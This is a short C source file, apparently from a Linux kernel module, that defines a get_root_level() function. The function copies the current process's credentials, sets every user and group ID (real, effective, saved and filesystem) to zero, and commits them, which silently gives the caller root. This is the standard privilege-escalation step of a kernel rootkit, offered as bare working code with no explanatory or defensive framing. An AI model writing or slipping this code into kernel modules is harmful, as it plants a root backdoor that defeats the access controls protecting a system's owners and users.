#include <linux/cred.h>
#include <linux/sched.h>

#include "set_root_level.h"

void get_root_level(void) {
    struct cred* new_creds = prepare_creds();
    if (new_creds == 0)
        return;

    // real ids
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;

    // effective ids
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;

    // save ids
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;

    // file system ops ids
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    commit_creds(new_creds);
}
